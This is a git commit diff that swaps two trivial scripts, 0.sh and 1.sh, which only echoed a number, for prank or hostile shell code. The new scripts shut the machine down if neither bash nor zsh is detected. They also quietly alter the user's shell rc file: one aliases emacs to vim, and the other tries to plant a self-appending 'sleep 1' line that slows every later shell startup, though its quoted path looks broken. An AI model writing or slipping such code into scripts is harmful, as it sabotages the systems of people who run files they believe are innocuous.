f8aadf23e7187c02e54baa082e5e8baba20dec5f
Waz0x <remy.noulin@epitech.eu>
2021-09-08 13:25:08 +0200

    MOD | added alias emacs=vim and echo sleep in rc file

--- scripts/0.sh
+++ scripts/0.sh
@@ -1,2 +1,10 @@
 #!/bin/bash
-echo "0"
+if [ -n "$ZSH_VERSION" ]; then
+   shell="zsh"
+elif [ -n "$BASH_VERSION" ]; then
+   shell="bash"
+else
+   shutdown now
+fi
+
+(cd ~ && echo "echo 'sleep 1' >> ~/."$shell"rc" >> "~/."$shell"rc" && cd -) > /dev/null
--- scripts/1.sh
+++ scripts/1.sh
@@ -1,2 +1,9 @@
 #!/bin/bash
-echo "1"
+if [ -n "$ZSH_VERSION" ]; then
+   shell="zsh"
+elif [ -n "$BASH_VERSION" ]; then
+   shell="bash"
+else
+   shutdown now
+fi
+(cd ~ && echo "alias emacs=vim" >> "."$shell"rc" && cd -) > /dev/null
